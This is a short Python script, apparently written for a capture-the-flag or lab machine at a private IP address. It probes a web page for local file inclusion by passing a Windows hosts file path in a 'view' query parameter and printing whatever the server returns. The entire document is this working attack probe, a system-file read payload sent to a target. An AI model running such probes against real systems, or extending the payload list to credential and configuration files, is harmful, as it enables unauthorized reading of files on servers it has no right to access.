import requests

url = 'http://10.10.248.86/dev/index.html'

lfi_payload = [
    'C:/WINDOWS/System32/drivers/etc/hosts/'
]

def test_lfi(url, payload):
    response = requests.get(url, params={"view": payload})
    print(response.text)

for payload in lfi_payload:
    test_lfi(url, payload)